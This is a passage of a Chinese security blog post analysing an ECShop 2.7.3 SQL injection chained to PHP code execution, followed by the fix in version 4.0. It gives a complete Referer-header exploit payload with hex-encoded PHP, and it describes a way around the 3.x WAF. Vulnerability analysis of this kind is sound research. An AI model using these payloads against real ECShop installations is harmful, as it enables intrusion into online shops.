+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;</span>, <span class="string">&quot;\$this-&gt;select(&#x27;\\1&#x27;);&quot;</span>, <span class="variable">$source</span>);</span><br></pre></td></tr></table></figure>
+
+<p>正则匹配到的值会交给<code>$this-select()</code>函数处理</p>
+<p>跟进<code>$this-select()</code></p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210817142618901.png" alt="image-20210817142618901"></p>
+<p>当传入的<code>$tag</code>第一个值是<code>$</code>，就会成为php标签包含的字符串，最终返回_eval()危险函数中</p>
+<p>但是在返回前，又被<code>$this-&gt;get_val</code>函数处理了，继续跟进<code>get_val</code>函数</p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210817142834524.png" alt="image-20210817142834524"></p>
+<p>当传入的<code>$val</code>中的值没有<code>.$</code>时，调用了<code>$this-&gt;make_var</code></p>
+<p>跟进<code>make_var</code></p>
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210817143600903.png" alt="image-20210817143600903"></p>
+<p>到这里就基本结束了，回到select函数中结合现在的语句</p>
+<blockquote>
+<?php echo $this->_var['  $val  '];?>
+</blockquote>
+<p>要成功利用的话，<code>$val</code>先要把<code>[&#39;</code>闭合，从下往上构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc&#39;];echo phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><code>select</code>函数进入<code>get_val</code>的条件是第一个字符必须是<code>$</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$abc&#39;];echo phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>接着要进入到select函数，需要被捕获</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc&#39;];echo phpinfo();&#x2F;&#x2F;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里出现的phpinfo()会被fetch_str函数第一个正则捕获，需要变换一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc&#39;];echo phpinfo&#x2F;**&#x2F;();&#x2F;&#x2F;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>到此为止就构造完成了</p>
+<p>最后一步就是将构造好的代码通过SQL注入漏洞的方式传递给<code>$position_style</code></p>
+<p>这里可以用union select 来控制查询的结果，根据之前的流程</p>
+<p><code>$row[&#39;position_id&#39;]</code>和<code>$arr[&#39;id&#39;]</code>要相等</p>
+<p>position_id是第二列，position_style是第九列</p>
+<p><code>$arr[&#39;id&#39;]</code>传入<code> &#39; /*</code></p>
+<p><code>$arr[&#39;num&#39;]</code>传入<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10--  -</code></p>
+<p><code>0x27202f2a</code>是<code>&#39; /*</code>的16进制值</p>
+<p><code>0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>是<code>$row[&#39;position_id&#39;]</code>的值，上面构造的php代码的16进制值，也就是<code>$position_style</code></p>
+<p>最终payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*&#x2F; union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&#39; &#x2F;*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/beytagh/beytagh/raw/master/img/image-20210724220650162.png" alt="image-20210724220650162"></p>
+<p>成功执行了phpinfo()</p>
+<br>
+
+<h2 id="三、ECShop-3-x-绕过"><a href="#三、ECShop-3-x-绕过" class="headerlink" title="三、ECShop 3.x 绕过"></a>三、ECShop 3.x 绕过</h2><p>上述的测试环境都是2.7.3的，理论上打2.x都没问题，而在3.x上是不行的，原因是3.x自带了个WAF(<code>ecshop/includes/safety.php</code>)，对所有传入的参数都做了检测，按照上面构造的 payload ，<code>union select</code> 会触发SQL注入的检测规则。</p>
+<p>3.x版本的<code>echash</code>是<code>45ea207d7a2b68c49582d2d22adf953a</code>。 上面说了 <code>insert_ads</code> 函数存在注入，并且有两个可控点，<code>$arr[&#39;id&#39;]</code>和<code>$arr[&#39;num&#39;]</code>，可以将<code>union select</code>通过两个参数传递进去，一个参数传递一个关键字，中间的可以使用<code>/**/</code>注释掉，这样就不会触发WAF。</p>
+<br>
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在ECShop 4.0上这个漏洞就被修复了，ecshop4/ecshop/includes/lib_insert.php中将传递进来的<code>$arr[id]</code>和<code>$arr[num]</code>强制转换成整型，这样就没法利用这个漏洞了官网也有相关的（2.x和3.x）的补丁。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ECShop-2-7-3/" rel="tag"># ECShop 2.7.3</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/14/when_did_you_born/" rel="prev" title="when_did_you_born">
+      <i class="fa fa-chevron-left"></i> when_did_you_born
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">一、SQL注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">二、代码执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81ECShop-3-x-%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">三、ECShop 3.x 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Beytagh"
+      src="/uploads/beytagh.jpg">
+  <p class="site-author-name" itemprop="name">Beytagh</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Beytagh</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
